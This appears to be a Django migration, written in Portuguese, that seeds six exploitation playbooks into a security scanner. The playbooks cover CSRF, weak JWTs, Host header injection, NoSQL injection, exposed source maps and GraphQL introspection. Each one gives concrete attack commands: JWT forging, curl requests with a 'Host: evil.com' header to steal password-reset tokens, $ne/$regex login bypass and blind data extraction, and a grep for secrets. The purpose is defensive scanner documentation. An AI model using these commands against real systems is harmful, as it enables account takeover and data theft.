# Semeia os playbooks das 6 classes de detecção novas (Fase C — cobertura
# expandida: CSRF, JWT fraco, Host Header Injection, NoSQL injection,
# exposição de source map e introspecção GraphQL).
#
# Mesmo padrão de 0006_seed_playbooks.py / 0008_seed_owasp_playbooks.py.
# `key` casa com `Finding.playbook_key` (ver `apps/scans/owasp.py`
# CLASS_TO_OWASP) e com os módulos de detecção em `apps/scans/web/`.

from django.db import migrations

OWASP_2021 = "https://owasp.org/Top10/"
OWASP_2025 = "https://owasp.org/Top10/2025/"

PLAYBOOKS = [
    {
        "key": "access-control.csrf",
        "category": "access-control",
        "vuln_class": "Cross-Site Request Forgery (CSRF)",
        "title": "Explorando CSRF num formulário sem token",
        "summary": (
            "Um formulário que altera estado (POST) sem token anti-CSRF pode "
            "ser submetido a partir de um site de terceiros, usando a sessão "
            "já autenticada da vítima no navegador, sem que ela perceba."
        ),
        "prerequisites": "Formulário POST sem campo de token CSRF; vítima autenticada no alvo.",
        "steps": [
            {
                "action": "Montar uma página com um formulário auto-submit apontando para a ação",
                "command": '<form action="{url}" method="POST">...<script>document.forms[0].submit()</script>',
                "expected": "A ação é executada no alvo usando a sessão da vítima.",
            },
            {
                "action": "Hospedar a página e induzir a vítima a visitá-la (fora do escopo técnico do Byakugan)",
                "command": "—",
                "expected": "Prova de conceito; execução real depende de engenharia social, não testada pelo Byakugan.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Ação forçada em nome da vítima",
                "impact": "session",
                "description": "Alterar dados/configurações da conta da vítima sem seu consentimento.",
            },
        ],
        "max_impact": "session",
        "tools": ["Burp Suite (CSRF PoC generator)", "navegador"],
        "references": [
            OWASP_2021 + "A01_2021-Broken_Access_Control/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/352.html",
        ],
    },
    {
        "key": "auth.jwt-weak",
        "category": "auth",
        "vuln_class": "JSON Web Token (JWT) fraco",
        "title": "Forjando um JWT com algoritmo 'none' ou segredo fraco",
        "summary": (
            "Um JWT que aceita 'alg: none' ou é assinado com um segredo "
            "HS256 trivial/comum permite forjar tokens arbitrários — "
            "incluindo se autenticar como qualquer usuário ou elevar privilégios."
        ),
        "prerequisites": "Token JWT observado em trânsito; alg=none aceito ou segredo HS256 fraco.",
        "steps": [
            {
                "action": "Decodificar o header/payload (sem validar assinatura)",
                "command": "echo '{token}' | cut -d. -f1,2 | base64 -d",
                "expected": "Claims visíveis (sub, role, exp) — define o que forjar.",
            },
            {
                "action": "Reassinar com o segredo fraco encontrado (ou alg=none) e reenviar",
                "command": "python3 -c \"import jwt; print(jwt.encode({{'sub':'admin'}}, '<segredo>', algorithm='HS256'))\"",
                "expected": "Backend aceita o token forjado como autêntico.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Impersonar outro usuário",
                "impact": "auth-bypass",
                "description": "Forjar um token com o 'sub'/id de outro usuário.",
            },
            {
                "stage": "2. Elevação de privilégio",
                "impact": "auth-bypass",
                "description": "Forjar um token com claim de role/admin elevada.",
            },
        ],
        "max_impact": "auth-bypass",
        "tools": ["jwt.io", "PyJWT", "jwt_tool"],
        "references": [
            OWASP_2021 + "A07_2021-Identification_and_Authentication_Failures/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/347.html",
        ],
    },
    {
        "key": "injection.host-header",
        "category": "injection",
        "vuln_class": "Host Header Injection",
        "title": "Envenenando links absolutos via header Host",
        "summary": (
            "Quando o backend monta URLs absolutas (reset de senha, "
            "canonical, links de e-mail) a partir do header Host recebido do "
            "cliente, um atacante pode trocá-lo para redirecionar vítimas a "
            "um domínio controlado (ex.: roubo de token de reset de senha)."
        ),
        "prerequisites": "Endpoint que reflete o Host em Location/corpo (link absoluto montado dinamicamente).",
        "steps": [
            {
                "action": "Repetir a requisição com Host malicioso",
                "command": 'curl -sk -H "Host: evil.com" "{url}"',
                "expected": "Resposta/redirect referencia 'evil.com' em vez do host real.",
            },
            {
                "action": "Encontrar um fluxo que envie esse link por e-mail (ex.: reset de senha)",
                "command": 'curl -sk -H "Host: evil.com" -X POST "{url}/forgot-password" -d "email=victim@x.com"',
                "expected": "E-mail de reset enviado com link apontando para o domínio malicioso.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Envenenamento de link absoluto",
                "impact": "info-disclosure",
                "description": "Link gerado pelo servidor aponta para domínio controlado pelo atacante.",
            },
            {
                "stage": "2. Roubo de token de reset de senha",
                "impact": "auth-bypass",
                "description": "Vítima clica no link malicioso enviado por e-mail legítimo do alvo; token vaza para o atacante.",
            },
        ],
        "max_impact": "auth-bypass",
        "tools": ["curl", "Burp Suite"],
        "references": [
            OWASP_2021 + "A03_2021-Injection/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/20.html",
        ],
    },
    {
        "key": "injection.nosqli",
        "category": "injection",
        "vuln_class": "NoSQL Injection",
        "title": "Contornando filtros com operadores MongoDB ($ne/$gt)",
        "summary": (
            "Quando um parâmetro é usado sem validação de tipo numa consulta "
            "MongoDB, enviar um operador de query (ex.: `campo[$ne]=x`) em "
            "vez de um valor literal pode contornar filtros de autenticação "
            "ou autorização (ex.: login sem senha correta)."
        ),
        "prerequisites": "Parâmetro usado diretamente numa consulta NoSQL sem allowlist de tipo.",
        "steps": [
            {
                "action": "Testar bypass de autenticação com operador $ne",
                "command": 'curl -sk "{url}" --data-urlencode "{param}[$ne]="',
                "expected": "Consulta casa qualquer valor diferente de vazio — login/filtro contornado.",
            },
            {
                "action": "Extrair dados caractere a caractere com $regex (blind)",
                "command": 'curl -sk "{url}" --data-urlencode "{param}[$regex]=^a"',
                "expected": "Resposta distinta confirma o primeiro caractere — repetir para extrair o valor completo.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Bypass de filtro/autenticação",
                "impact": "auth-bypass",
                "description": "Operador $ne/$gt contorna a comparação exata esperada.",
            },
            {
                "stage": "2. Extração de dados (blind, char-by-char)",
                "impact": "db-read",
                "description": "$regex permite inferir valores de campos sensíveis sem erro visível.",
            },
        ],
        "max_impact": "db-read",
        "tools": ["curl", "Burp Suite", "NoSQLMap"],
        "references": [
            OWASP_2021 + "A03_2021-Injection/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/943.html",
        ],
    },
    {
        "key": "exposure.source-map",
        "category": "exposure",
        "vuln_class": "Exposição de source map (.js.map)",
        "title": "Reconstruindo código-fonte a partir de um source map exposto",
        "summary": (
            "Um arquivo .js.map acessível permite reconstruir o JavaScript "
            "original (não minificado) — comentários, nomes de variáveis, "
            "lógica de negócio e, com frequência, endpoints de API internos "
            "não documentados publicamente."
        ),
        "prerequisites": "Script .js referenciado pela aplicação com .map correspondente acessível.",
        "steps": [
            {
                "action": "Baixar o source map e reconstruir o código original",
                "command": 'curl -sk "{url}.map" -o out.map && npx source-map-explorer out.map',
                "expected": "Código JS original legível, com comentários e nomes originais.",
            },
            {
                "action": "Buscar segredos/endpoints internos no código reconstruído",
                "command": 'grep -iE "api[_-]?key|secret|/internal/|/admin/" <código reconstruído>',
                "expected": "Endpoints não documentados ou credenciais hardcoded no frontend.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Vazamento de lógica de negócio/endpoints",
                "impact": "info-disclosure",
                "description": "Mapeia a superfície de ataque real da API a partir do código reconstruído.",
            },
        ],
        "max_impact": "info-disclosure",
        "tools": ["source-map-explorer", "curl"],
        "references": [
            OWASP_2021 + "A05_2021-Security_Misconfiguration/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/540.html",
        ],
    },
    {
        "key": "exposure.graphql-introspection",
        "category": "exposure",
        "vuln_class": "Introspecção GraphQL exposta",
        "title": "Mapeando a API completa via introspecção GraphQL",
        "summary": (
            "Com introspecção habilitada, qualquer cliente não-autenticado "
            "pode enumerar o schema completo da API — todos os tipos, "
            "campos, queries e mutations, incluindo os não documentados."
        ),
        "prerequisites": "Endpoint GraphQL acessível sem autenticação com introspecção habilitada.",
        "steps": [
            {
                "action": "Baixar o schema completo via introspecção",
                "command": 'curl -sk "{url}" -X POST -H "Content-Type: application/json" -d \'{{"query":"{{__schema{{types{{name fields{{name}}}}}}}}"}}\'',
                "expected": "Schema completo (tipos/campos/mutations) retornado em JSON.",
            },
            {
                "action": "Explorar mutations/queries não documentadas publicamente",
                "command": "ferramenta GraphQL (GraphiQL/Altair) apontando para o endpoint",
                "expected": "Funcionalidade administrativa ou sensível encontrada no schema.",
            },
        ],
        "escalation_path": [
            {
                "stage": "1. Mapeamento completo da superfície de ataque",
                "impact": "info-disclosure",
                "description": "Todo o schema (incluindo mutations administrativas) fica visível.",
            },
        ],
        "max_impact": "info-disclosure",
        "tools": ["GraphiQL", "Altair", "InQL", "curl"],
        "references": [
            OWASP_2021 + "A05_2021-Security_Misconfiguration/",
            OWASP_2025,
            "https://cwe.mitre.org/data/definitions/215.html",
        ],
    },
]


def seed_playbooks(apps, schema_editor):
    ExploitationPlaybook = apps.get_model("scans", "ExploitationPlaybook")
    for pb in PLAYBOOKS:
        ExploitationPlaybook.objects.update_or_create(
            key=pb["key"],
            defaults={k: v for k, v in pb.items() if k != "key"},
        )


def remove_playbooks(apps, schema_editor):
    ExploitationPlaybook = apps.get_model("scans", "ExploitationPlaybook")
    ExploitationPlaybook.objects.filter(key__in=[p["key"] for p in PLAYBOOKS]).delete()


class Migration(migrations.Migration):

    dependencies = [
        ("scans", "0010_target_authorization_optional"),
    ]

    operations = [migrations.RunPython(seed_playbooks, remove_playbooks)]
